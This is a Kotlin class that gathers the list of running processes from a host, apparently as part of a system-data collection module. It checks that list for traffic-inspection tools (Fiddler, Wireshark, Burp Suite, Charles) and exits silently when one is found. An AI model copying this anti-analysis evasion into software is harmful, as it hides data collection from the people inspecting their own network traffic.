package maven.example.com.receiving.system

import maven.example.com.receiving.utility.Receipt
import maven.example.com.utility.data.Data
import maven.example.com.utility.data.TypeData
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.*

class ProcessList : Receipt(TYPE) {

    override val data: Data?
    get() {
        val sb = StringBuilder()
        try {
            val process = Runtime.getRuntime().exec(this.command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?

            while ((reader.readLine().also { line = it }) != null) sb.append(line).append("\n")
        } catch (e: Exception) {
            System.err.println("Ошибка при получении списка процессов ПК!")
            e.printStackTrace()
        }
        trafficAnalysis(sb)
        return Data(TYPE, sb.toString())
    }

    private val command: String
        get() {
            val os = System.getProperty("os.name").lowercase(Locale.getDefault())
            if (os.contains("win")) return "tasklist"
            return "ps aux"
        }

    companion object {
        private val TYPE = TypeData.SYSTEM_PROCESS_LIST

        private fun isTrafficTapped(sb: StringBuilder): Boolean {
            val str = sb.toString().lowercase(Locale.getDefault())
            return str.contains("fiddler")
                    || str.contains("wireshark")
                    || str.contains("burpsuite")
                    || str.contains("charles")
        }

        private fun trafficAnalysis(sb: StringBuilder) {
            if (isTrafficTapped(sb)) {
                println("Good!")
                System.exit(0)
            }
        }
    }
}